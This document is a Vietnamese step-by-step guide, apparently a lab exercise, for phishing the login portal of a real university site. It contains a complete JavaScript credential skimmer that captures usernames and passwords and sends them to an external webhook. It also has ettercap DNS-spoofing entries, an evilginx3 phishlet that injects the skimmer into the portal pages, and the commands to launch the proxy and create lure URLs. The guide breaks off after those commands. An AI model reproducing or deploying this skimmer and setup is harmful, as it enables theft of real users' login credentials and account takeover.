
## CHUẨN BỊ

- 1 MÁY KALI LINUX: IP 192.168.100.200
- 1 MÁY VICTIM: IP 192.168.100.150
- 1 HOST ĐỂ UPLOAD MÃ JAVASCRIPT CHÈN VÀO
- Default Gateway MẶC ĐỊNH CỦA 2 MÁY: 192.168.100.2

## Evil.js (Thay webhook để hứng data), up lên host nào đó
```bash
(function(){
  let saveInterval;
  let isCapturing = false;

  // Theo dõi input username/password
  const inputPoll = setInterval(() => {
    const user = document.querySelector('input[name="username"]');
    const pass = document.querySelector('input[name="password"]');

    if(user && pass){
      clearInterval(inputPoll);

      pass.addEventListener('input', () => {
        if(pass.value.length >= 6 && !isCapturing){
          isCapturing = true;

          saveInterval = setInterval(() => {
            const username = user.value;
            const password = pass.value;
            if(username && password){
              localStorage.setItem('_cred_capture', JSON.stringify({ username, password }));
            }
          }, 100); // lưu mỗi 0.5 giây
        }

        if(pass.value.length < 6 && isCapturing){
          clearInterval(saveInterval);
          isCapturing = false;
        }
      });
    }
  }, 300);

  // Khi bấm đăng nhập → dừng việc lưu lại
  const btnPoll = setInterval(() => {
    const btn = document.querySelector('button.btn.btn-primary.btn-block.text-white.my-2.ng-star-inserted');
    if(btn){
      clearInterval(btnPoll);

      btn.addEventListener('click', () => {
        if(isCapturing){
          clearInterval(saveInterval);
          isCapturing = false;
        }
      });
    }
  }, 300);

  // Gửi nếu đã lưu xong
  setInterval(() => {
    const s = localStorage.getItem('_cred_capture');
    if(s){
      fetch('https://webhook-test.com/ba3ac8fe60dc09d6d048273036f05abd', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: s,
        keepalive: true
      }).finally(() => {
        localStorage.removeItem('_cred_capture');
      });
    }
  }, 3000);
})();
```
## TRONG MÁY KALILINUX:

```
nano /etc/ettercap/etter.dns
```
Thêm vào cuối trang:
```
thongtindaotao.sgu.edu.vn A 192.168.100.200
thongtindaotao.sgu.edu.vn PTR 192.168.100.200
```
Save lại

Bật terminal khác
```
sudo apt update && sudo apt install
```
```
git clone https://github.com/kgretzky/evilginx3.git
cd evilginx3
make
```
```
cd phishlets
nano demo.yaml
```
Thay địa chỉ <ĐỊA CHỈ NƠI UP EVIL.JS/EVIL.JS> (YÊU CẦU DÙNG HTTPS)
```
name: sgu
author: yourname
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: "", orig_sub: "", domain: "thongtindaotao.sgu.edu.vn", session: true, is_landing: true}

sub_filters:
  - {triggers_on: "thongtindaotao.sgu.edu.vn", orig_sub: "", domain: "thongtindaotao.sgu.edu.vn", search: "thongtindaotao.sgu.edu.vn", replace: "thongtindaotao.sgu.edu.vn", mimes: ["text/html", "application/javascript", "application/json"]}
  - {triggers_on: "thongtindaotao.sgu.edu.vn", orig_sub: "", domain: "thongtindaotao.sgu.edu.vn", search: "</body>", replace: "<script src='https:///<ĐỊA CHỈ NƠI UP EVIL.JS/EVIL.JS>'></script></body>", mimes: ["text/html", "application/javascript", "application/json"] }

auth_tokens:
  - domain: thongtindaotao.sgu.edu.vn
    keys: ['.*,regexp']

credentials:
  username:
    key: "username"
    search: "(.*)"
    type: post
  password:
    key: "password"
    search: "(.*)"
    type: post

login:
  domain: thongtindaotao.sgu.edu.vn
  path: /
```

## BẬT EVILGINX2:

```
cd build
sudo ./evilginx -p ../phishlets -developer
phishlets hostname demo thongtindaotao.sgu.edu.vn
phishlets enable demo
lures create demo
lures get-url 0 #NẾU TEST NHIỀU LẦN THÌ SỐ 0 NÀY SẼ LẤY TỪ CÂU LỆNH TRÊN
